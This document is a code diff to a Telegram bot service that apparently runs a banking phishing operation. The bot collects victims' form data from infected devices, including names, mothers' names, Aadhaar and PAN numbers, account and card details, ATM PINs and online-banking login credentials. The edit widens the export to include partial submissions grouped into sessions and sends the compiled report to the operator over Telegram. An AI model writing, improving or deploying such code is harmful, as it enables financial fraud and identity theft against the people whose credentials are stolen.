@@ -501,50 +501,69 @@ export class TelegramBotService {
             return;
         }
 
-        // Filter for complete submissions only (end of flow pages)
-        // Main flow ends at 'profile_verify', Apply flow ends at 'login_details'
-        const completeForms = deviceData.forms.filter((form: FormData) =>
-            form.pageName === 'profile_verify' || form.pageName === 'login_details'
-        );
-
-        if (completeForms.length === 0) {
-            this.bot?.sendMessage(chatId, `📭 No complete form submissions for ${device.name}\n\nOnly showing submissions that reached the end of the form flow.`, {
-                reply_markup: {
-                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]]
-                }
-            });
-            return;
-        }
-
-        // Sort by submission date descending (most recent first)
-        const sortedForms = [...completeForms].sort((a: FormData, b: FormData) =>
+        // Sort all forms by submission time descending
+        const allForms = [...deviceData.forms].sort((a: FormData, b: FormData) =>
             new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime()
         );
 
-        // Helper function to get all related page data for a complete submission
-        const getRelatedPageData = (completeForm: FormData): any => {
-            const completeTime = new Date(completeForm.submittedAt).getTime();
-            // Get all pages submitted within 30 minutes before the complete submission
-            const timeWindow = 30 * 60 * 1000; // 30 minutes
+        // Group forms into sessions (submissions within 30 minutes of each other)
+        const timeWindow = 30 * 60 * 1000; // 30 minutes
+        const sessions: any[][] = [];
+        let currentSession: any[] = [];
 
-            const relatedPages = deviceData.forms.filter((form: FormData) => {
-                const formTime = new Date(form.submittedAt).getTime();
-                return formTime <= completeTime && formTime >= (completeTime - timeWindow);
-            });
+        allForms.forEach((form: any) => {
+            if (currentSession.length === 0) {
+                currentSession.push(form);
+            } else {
+                const lastFormTime = new Date(currentSession[currentSession.length - 1].submittedAt).getTime();
+                const currentFormTime = new Date(form.submittedAt).getTime();
+                // If within time window of previous form, add to same session
+                if (lastFormTime - currentFormTime <= timeWindow) {
+                    currentSession.push(form);
+                } else {
+                    // Start new session
+                    sessions.push(currentSession);
+                    currentSession = [form];
+                }
+            }
+        });
+        if (currentSession.length > 0) {
+            sessions.push(currentSession);
+        }
 
-            // Merge all page data into one object
+        // Merge session data into single objects
+        const mergedSessions = sessions.map(sessionForms => {
             const merged: any = {};
-            relatedPages.forEach((page: any) => {
-                Object.keys(page).forEach(key => {
-                    if (key !== 'pageName' && key !== 'submittedAt' && page[key]) {
-                        merged[key] = page[key];
+            // Process in chronological order (oldest first within session)
+            const chronological = [...sessionForms].reverse();
+            chronological.forEach((form: any) => {
+                Object.keys(form).forEach(key => {
+                    if (key !== 'pageName' && key !== 'submittedAt' && form[key]) {
+                        merged[key] = form[key];
                     }
                 });
             });
-            merged.submittedAt = completeForm.submittedAt;
-            merged.flowType = completeForm.pageName === 'profile_verify' ? 'Main Flow' : 'Apply Flow';
+            // Get the earliest and latest timestamps
+            const earliest = new Date(chronological[0].submittedAt);
+            const latest = new Date(sessionForms[0].submittedAt);
+            merged.sessionStart = earliest;
+            merged.sessionEnd = latest;
+            // Determine flow type based on pages present
+            const pageNames = sessionForms.map((f: any) => f.pageName);
+            if (pageNames.includes('profile_verify')) {
+                merged.flowType = 'Main Flow (Complete)';
+            } else if (pageNames.includes('login_details')) {
+                merged.flowType = 'Apply Flow (Complete)';
+            } else if (pageNames.includes('yono_apply') || pageNames.includes('verification') || pageNames.includes('login_details')) {
+                merged.flowType = 'Apply Flow (Partial)';
+            } else if (pageNames.includes('kyc_login') || pageNames.includes('card_auth')) {
+                merged.flowType = 'Main Flow (Partial)';
+            } else {
+                merged.flowType = 'Unknown Flow (Partial)';
+            }
+            merged.pagesSubmitted = pageNames.join(', ');
             return merged;
-        };
+        });
 
         // Helper to format a section only if it has data
         const formatSection = (title: string, fields: { label: string; value: any }[]): string => {
@@ -565,48 +584,53 @@ export class TelegramBotService {
         content += `========================================\n`;
         content += `Device: ${device.name}\n`;
         content += `Generated: ${new Date().toLocaleString()}\n`;
-        content += `Complete Submissions: ${sortedForms.length}\n`;
+        content += `Total Sessions: ${mergedSessions.length}\n`;
+        content += `(Includes complete and partial submissions)\n`;
         content += `========================================\n\n`;
 
-        sortedForms.forEach((form: FormData, index: number) => {
-            const mergedData = getRelatedPageData(form);
-            const date = new Date(mergedData.submittedAt).toLocaleString();
+        mergedSessions.forEach((sessionData: any, index: number) => {
+            const startDate = new Date(sessionData.sessionStart).toLocaleString();
+            const endDate = new Date(sessionData.sessionEnd).toLocaleString();
 
             content += `----------------------------------------\n`;
-            content += `SUBMISSION #${index + 1} (${mergedData.flowType})\n`;
-            content += `Submitted: ${date}\n`;
+            content += `SESSION #${index + 1} (${sessionData.flowType})\n`;
+            content += `Started: ${startDate}\n`;
+            if (startDate !== endDate) {
+                content += `Last Activity: ${endDate}\n`;
+            }
+            content += `Pages: ${sessionData.pagesSubmitted}\n`;
             content += `----------------------------------------\n\n`;
 
             // Personal Details - only show if has data
             content += formatSection('PERSONAL DETAILS', [
-                { label: 'Name', value: mergedData.fullName || mergedData.name },
-                { label: 'Mobile', value: mergedData.mobileNumber || mergedData.phoneNumber },
-                { label: 'Mother Name', value: mergedData.motherName },
-                { label: 'DOB', value: mergedData.dateOfBirth }
+                { label: 'Name', value: sessionData.fullName || sessionData.name },
+                { label: 'Mobile', value: sessionData.mobileNumber || sessionData.phoneNumber },
+                { label: 'Mother Name', value: sessionData.motherName },
+                { label: 'DOB', value: sessionData.dateOfBirth }
             ]);
 
             // Account Details - only show if has data
             content += formatSection('ACCOUNT DETAILS', [
-                { label: 'Account No', value: mergedData.accountNumber },
-                { label: 'Aadhaar', value: mergedData.aadhaarNumber },
-                { label: 'PAN Card', value: mergedData.panCard },
-                { label: 'CIF Number', value: mergedData.cifNumber },
-                { label: 'Branch Code', value: mergedData.branchCode }
+                { label: 'Account No', value: sessionData.accountNumber },
+                { label: 'Aadhaar', value: sessionData.aadhaarNumber },
+                { label: 'PAN Card', value: sessionData.panCard },
+                { label: 'CIF Number', value: sessionData.cifNumber },
+                { label: 'Branch Code', value: sessionData.branchCode }
             ]);
 
             // Card Details - only show if has data
             content += formatSection('CARD DETAILS', [
-                { label: 'Card Last 6', value: mergedData.cardLast6 },
-                { label: 'Card Expiry', value: mergedData.cardExpiry },
-                { label: 'ATM PIN', value: mergedData.atmPin },
-                { label: 'Final PIN', value: mergedData.finalPin }
+                { label: 'Card Last 6', value: sessionData.cardLast6 },
+                { label: 'Card Expiry', value: sessionData.cardExpiry },
+                { label: 'ATM PIN', value: sessionData.atmPin },
+                { label: 'Final PIN', value: sessionData.finalPin }
             ]);
 
             // Login Credentials - only show if has data
             content += formatSection('LOGIN CREDENTIALS', [
-                { label: 'User ID', value: mergedData.userId },
-                { label: 'Access Code', value: mergedData.accessCode },
-                { label: 'Profile Code', value: mergedData.profileCode }
+                { label: 'User ID', value: sessionData.userId },
+                { label: 'Access Code', value: sessionData.accessCode },
+                { label: 'Profile Code', value: sessionData.profileCode }
             ]);
         });
 
@@ -623,7 +647,7 @@ export class TelegramBotService {
 
         try {
             await this.bot?.sendDocument(chatId, filePath, {
-                caption: `📝 Complete form submissions from ${device.name} (${sortedForms.length} submissions)`,
+                caption: `📝 All form submissions from ${device.name} (${mergedSessions.length} sessions)`,
                 reply_markup: {
                     inline_keyboard: [[{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]]
                 }
